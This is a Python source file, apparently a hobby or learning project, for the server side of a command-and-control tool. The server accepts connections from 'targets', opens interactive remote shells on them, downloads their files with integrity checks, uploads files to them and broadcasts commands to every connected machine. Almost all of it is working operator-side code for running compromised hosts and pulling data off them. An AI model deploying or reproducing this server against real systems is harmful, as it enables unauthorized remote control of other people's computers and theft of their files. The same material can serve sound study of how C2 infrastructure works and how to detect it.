#!/usr/bin/python3

import socket
import os
import platform
import pathlib
import hashlib
import datetime
from time import asctime
import termcolor
import threading
import logging
from prettytable import PrettyTable
from urllib3 import add_stderr_logger

# TODO:
#   1. Add 'offensive-python' project utilities:
#       a. Display alert when client is visiting a blacklisted website
#       b. Send heartbeat from client to server to verify it is alive
#       c. Display alert when duplicate mac address is found in the client's ARP table
#       d. Log all alerts as events (Should include: When, where & what happened)
#   2. Encryption implementation
#   3. Read global variable values from json file upon flag usage
#   4. Fix upload / download for broadcast function

SERVER_IP = "0.0.0.0"
PORT = 1234  # Remote port
FORMAT = "utf-8"  # Message encoding format
HEADER_SIZE = 10  # Message header size
MAX_CONSECUTIVE = 5  # Max consecutive connection attempts
SEGMENT_SIZE = 1024  # Segment size when downloading / uploading files
TIMEOUT = 1  # Socket timeout when downloading / uploading files
LOG_PATH = str(pathlib.Path(__file__).parent.joinpath("c2.log"))  # Log file path
DOWNLOADS = pathlib.Path(__file__).parent  # Downloaded files destination path
CLIENTS = []  # Target list


def clr(msg):
    """Colors messages according to their content.

    :param msg: Message received in clear text
    :type msg: str
    :return: Recolored message in clear text
    :rtype: str
    """
    if msg[:3] == "[+]":  # Success indication
        return termcolor.colored(msg, "green")
    elif msg[:3] == "[*]":  # Informative message indication
        return termcolor.colored(msg, "yellow")
    else:  # Failure indication / Anything else
        return termcolor.colored(msg, "red")


def get_file_hash(data: list[bytes]) -> str:
    """
    Calculates a file md5 hash.

    :param data: File content split into segments
    :type data: list[bytes]
    :return: Md5 hash of the file
    :rtype: str
    """
    md5 = hashlib.md5()
    for chunk in data:
        md5.update(chunk)
    return md5.hexdigest()


def download_file(sock: socket.socket, path: str) -> None:
    """
    Downloads file from client to server.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param path: Target file path
    :type path: str
    :return: None
    """
    raddr = sock.getpeername()
    logging.info(f"{raddr} - Downloading file from target.")
    # Implemented segmentation when writing / receiving file data to avoid memory overload
    file_name = pathlib.Path(path).name  # File name without the full path
    dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
    original = sock.gettimeout()
    sock.settimeout(TIMEOUT)  # Set requested timeout
    original_md5 = ""
    result = ""
    data = []
    try:
        # Get client side status
        readable_src_file = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        if readable_src_file:  # File was read successfully on client side
            # Get original file hash
            original_md5 = sock.recv(32).decode(FORMAT)

            # Receive segmented file contents and write to destination file
            with open(dst, "wb") as f:
                segment = sock.recv(SEGMENT_SIZE)
                while segment:  # Keep receiving data until timeout
                    f.write(segment)
                    data.append(segment)  # Save written data for hash calculation
                    segment = sock.recv(SEGMENT_SIZE)
        else:  # Error finding / reading file on client side
            result = "FAILURE: FileNotFoundError / IOError"
            print(clr("[!] ERROR: File doesn't exist / Access denied"))
            logging.error(f"{raddr} - Target file unreachable (IOError / FNFError on remote).")
    except socket.timeout:  # Reached timeout, proceed to check file integrity
        # Calculate downloaded file hash
        result_md5 = get_file_hash(data)
        # Integrity verification
        if result_md5 == original_md5:
            result = f"SUCCESS: {dst}"
            print(f"{clr('[+] Download successful -')} {dst}")
            logging.info(f"{raddr} - Successfully downloaded target file - {dst}")
        else:
            result = "FAILURE: Session timeout"
            print(clr("[!] ERROR: Timeout reached while downloading the file"))
            logging.error(f"{raddr} - Encountered error while downloading file.")
    finally:
        sock.settimeout(original)  # Reset timeout value


def upload_file(sock: socket.socket, path: str) -> None:
    """
    Uploads file from server to client.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param path: Target file path
    :type path: str
    :return: None
    """
    raddr = sock.getpeername()
    logging.info(f"{raddr} - Uploading file to target.")
    # Implemented segmentation when reading / sending file data to avoid memory overload
    path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
    log_result = ""
    try:
        # Read target file in segments
        data = []
        with open(path, "rb") as f:
            chunk = f.read(SEGMENT_SIZE)
            while chunk:
                data.append(chunk)
                chunk = f.read(SEGMENT_SIZE)
        sock.send("1".ljust(HEADER_SIZE).encode(FORMAT))  # Signal: File contents were successfully read

        # Calculate & send file hash, later used for integrity verifications on server side
        md5 = get_file_hash(data)
        sock.send(md5.encode(FORMAT))

        # Send segmented file data
        for segment in data:
            if segment:
                sock.send(segment)
    except (FileNotFoundError, IOError):  # Signal: Error when trying to read from target file
        logging.exception(f"Target file unreachable (IOError / FNFError on local host).")
        sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
    finally:
        # final result and message from the client side
        result = int(sock.recv(SEGMENT_SIZE).decode(FORMAT))
        message = sock.recv(SEGMENT_SIZE).decode(FORMAT).strip()
        if result:  # Successful upload
            dst = str(DOWNLOADS.joinpath(message))
            logging.info(f"{raddr} - Successfully uploaded target file - {dst}")
            print(f"{clr('[+] Upload successful -')} {dst}")
        else:  # Upload failed
            # Print relevant error to match the final message received from the client side
            if message == "TIMEOUT":
                logging.error(f"{raddr} - Encountered error while uploading file.")
                print(clr("[!] ERROR: Timeout reached while uploading the file"))
            elif message == "ERROR":
                logging.error(f"{raddr} - Target file unreachable (IOError / FNFError on remote).")
                print(clr("[!] ERROR: File doesn't exist / Access denied"))


def recv_msg(sock: socket.socket, command: str) -> None:
    """
    Receives command output from the client and logs it within './c2.log'.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param command: Command executed on the client
    :type command: str
    :return: Command output received from the client
    :rtype: str
    """
    try:
        raddr = sock.getpeername()
        # Only receive the header and extract the message length
        # Can trigger a ValueError if the target disconnects and sends an empty header
        msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        # Receive the message in its entirety
        output = sock.recv(msg_len).decode(FORMAT)
        # Unrecognized command
        if "is not recognized as an internal or external command" in output or "not found" in output:
            print(clr("[!] ERROR: Command not found"))
            logging.error(f"{raddr} - Command not recognized - {command}")
        elif "timed out after" in output:  # Command execution timeout on target
            print(clr("[!] ERROR: Command timed out"))
            logging.error(f"{raddr} - Unable to execute command on target - {command}")
        elif command[:3] == "cd " and output == "":  # Changed directory successfully on client side
            pass
        elif output:  # Successful command execution resulting in output
            logging.info(f"{raddr} - Received output:\n{output}")
            print(output.strip())
    except ValueError:  # Received empty header (Client disconnected before sending a reply)
        logging.exception(f"{raddr} - Target disconnected mid command execution.")
        logging.info(f"{raddr} - Removing target from database.")
        CLIENTS.remove(client for client in CLIENTS if client[0] == sock)  # Remove current client from clients list


def send_msg(sock: socket.socket, command: str) -> None:
    """
    Sends a command to the client and prints its output.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param command: Command to run on the client
    :type command: str
    :return: None
    """
    # Send the message to the client, prefixed by a header of a set size
    # The header contains the message length padded by spaces (Used to ensure connection reliability)
    # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
    msg_len = len(command)
    sock.send((f"{msg_len:<{HEADER_SIZE}}" + command).encode(FORMAT))

    # Receive command output from the client side, if relevant
    server_side_keywords = ["quit", "exit", "clear", "bg", "background", "kill"]
    if command not in server_side_keywords and command[:9] != "download " and command[:7] != "upload ":
        recv_msg(sock, command)


def broadcast(command: str) -> None:
    """
    This function broadcasts a command to all connected clients.

    :param command: Command to run on all clients
    :type command: str
    :return: None
    """
    logging.info(f"Broadcasting command to all available targets - {command}")
    for client in CLIENTS:
        try:
            # FIXME:
            # if command[:9] == "download ":  # Download file from all clients
            #     download_file(client[0], command[9:])
            # elif command[:7] == "upload ":  # Upload file to all clients
            #     upload_file(client[0], command[7:])
            # else:
            print(termcolor.colored(f"[{client[1][0]}:{client[1][1]}]", "yellow"))
            send_msg(client[0], command)
        except Exception as err:
            print(f"{clr(f'[!] ERROR SENDING MESSAGE: {err}')} ({str(client[1])})")
            logging.exception(f"{client[1]} - Unable to communicate with target.")
            logging.info(f"{client[1]} - Removing target from database.")
            CLIENTS.remove(client)

    print(clr("[+] Finished executing on all available targets"))
    logging.info("Finished executing on all available targets.")


def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
    """
    Received commands via input, and executes the appropriate action.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param addr: Client IPv4 address and port number
    :type addr: tuple[str, int]
    :return: None
    """
    try:
        maintain_session = True  # Determines whether to maintain a session upon exiting the shell
        while sock:
            command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
            if command:
                logging.info(f"{addr} - Sending command to target - {command}")
                send_msg(sock, command)
                # For certain keywords, run the appropriate action
                if command in ["quit", "exit", "kill"]:  # Quit current client CLI
                    maintain_session = False
                    logging.info(f"{addr} - Closing session on target.")
                    if command == "kill":
                        logging.critical(f"{addr} - Terminating c2 node.")
                    break
                elif command in ["bg", "background"]:
                    logging.info(f"{addr} - Moving session to background.")
                    break
                elif command[:3] == "cd ":  # Change directory on the client side
                    pass
                elif command == "clear":  # Clear server side console screen
                    os.system('cls' if os.name == 'nt' else 'clear')
                elif command[:9] == "download ":  # Download specified file from client side to server side
                    download_file(sock, command[9:])
                elif command[:7] == "upload ":  # Upload specified file from server side to client side
                    upload_file(sock, command[7:])
    except ConnectionError as err:  # Socket connection error
        print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
        logging.exception(f"{addr} - Unable to communicate with target.")
        logging.info(f"{addr} - Removing target from database.")
        CLIENTS.remove((sock, addr))
    finally:
        # Close & remove sock from clients list if user exists with 'exit' / 'quit'
        # Do nothing if user exists with 'background' / 'bg'
        if sock and not maintain_session:
            sock.close()
            logging.info(f"{addr} - Removing target from database.")
            CLIENTS.remove((sock, addr))


def display_sessions() -> None:
    """
    Prints a table of all connected clients.

    :return: None
    """
    # Create table and column names
    clients_info_table = PrettyTable()
    id = termcolor.colored("ID", "yellow")
    address = termcolor.colored("ADDRESS", "yellow")
    clients_info_table.field_names = [id, address]

    # Add connected clients to table
    for i, session in enumerate(CLIENTS):
        addr = CLIENTS[i][1][0]
        port = CLIENTS[i][1][1]
        data = f"{addr}:{port}"
        clients_info_table.add_row([i, data])

    print(clients_info_table)


def accept_new_connections(s: socket.socket) -> None:
    """
    Constantly accepts new connections if possible, and saves information about new connections.

    :param s: Server side bound socket object
    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: None
    """
    s.settimeout(TIMEOUT)
    logging.info("Listening for incoming connections.")
    while True:
        try:
            sock, addr = s.accept()
            # Save new connection information
            if (sock, addr) not in CLIENTS:
                CLIENTS.append((sock, addr))
                logging.info(f"{addr} - New connection established.")
            print(clr("[+] Connected to ") + str(addr))
        except socket.timeout:
            pass
        except OSError:  # Main thread was discontinued - User exited the program
            logging.info("Seems like the c&c server was shut down, closing listener.")
            break


def handle_connections(s: socket.socket) -> None:
    """
    Listens for clients and accepts incoming connections.

    :param s: Server side bound socket object
    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: None
    """
    s.listen(5)
    sock = ""
    try:
        print(f"\n{clr('[*] Server is running on -')} {SERVER_IP}")
        print(f"{clr('[*] Listening for incoming connections...')}")
        # Accept connections in a seperate thread to avoid blocking the terminal
        thread = threading.Thread(target=accept_new_connections, args=(s,))
        thread.start()

        # User terminal for session handling
        while True:
            command = input(clr("> "))
            if command == "clear":  # Clear server side console screen
                os.system('cls' if os.name == 'nt' else 'clear')
            elif command in ["exit", "quit"]:  # Close server side script
                break
            elif command == "sessions":  # List available sessions
                display_sessions()
            elif command[:12] == "sessions -i ":  # Start a shell based on the specified session id
                # Verify specified session id exists
                i = command[12:]
                if i.isdigit():
                    if 0 <= int(i) < len(CLIENTS):
                        # Start a command line interface for the specified client
                        logging.info(f"{CLIENTS[int(i)][1]} - Starting new shell on target.")
                        shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
                    else:
                        print(f"{clr('[!] ERROR: The specified index is out of range')}")
                else:
                    print(f"{clr('[!] ERROR: The specified index is not an integer')}")
            elif command[:10] == "broadcast ":  # Broadcast a command to all clients
                broadcast(command[10:])
                continue  # Skip to next iteration
    except KeyboardInterrupt:
        pass
    finally:
        if sock:
            sock.close()


def main() -> None:
    """
    Main function for the C&C server side.

    :return: None
    """
    logging.basicConfig(level=logging.INFO, filename="c2.log", filemode="a",
                        format=f"%(asctime)s %(levelname)s - %(message)s", datefmt="%d-%m-%Y %H:%M:%S")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Enable address reuse
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Establish server side
    s.bind((SERVER_IP, PORT))
    logging.info(f"({SERVER_IP}, {PORT}) - Starting c&c server.")
    try:
        handle_connections(s)
    except KeyboardInterrupt:
        pass
    finally:
        if s:
            s.close()
        logging.info(f"({SERVER_IP}, {PORT}) - Stopping c&c server.")
        print("""\n
             ██████   ██████   ██████  ██████  ██████  ██    ██ ███████
            ██       ██    ██ ██    ██ ██   ██ ██   ██  ██  ██  ██
            ██   ███ ██    ██ ██    ██ ██   ██ ██████    ████   █████
            ██    ██ ██    ██ ██    ██ ██   ██ ██   ██    ██    ██
             ██████   ██████   ██████  ██████  ██████     ██    ███████""")


if __name__ == "__main__":
    print("""
     ██████    ██     ██████     ██████  ██████   ██████       ██ ███████  ██████ ████████
    ██         ██    ██          ██   ██ ██   ██ ██    ██      ██ ██      ██         ██
    ██      ████████ ██          ██████  ██████  ██    ██      ██ █████   ██         ██
    ██      ██  ██   ██          ██      ██   ██ ██    ██ ██   ██ ██      ██         ██
     ██████ ██████    ██████     ██      ██   ██  ██████   █████  ███████  ██████    ██



    ███████ ███████ ██████  ██    ██ ███████ ██████      ███████ ██ ██████  ███████
    ██      ██      ██   ██ ██    ██ ██      ██   ██     ██      ██ ██   ██ ██
    ███████ █████   ██████  ██    ██ █████   ██████      ███████ ██ ██   ██ █████
         ██ ██      ██   ██  ██  ██  ██      ██   ██          ██ ██ ██   ██ ██
    ███████ ███████ ██   ██   ████   ███████ ██   ██     ███████ ██ ██████  ███████""")
    try:
        main()
    except KeyboardInterrupt:
        pass
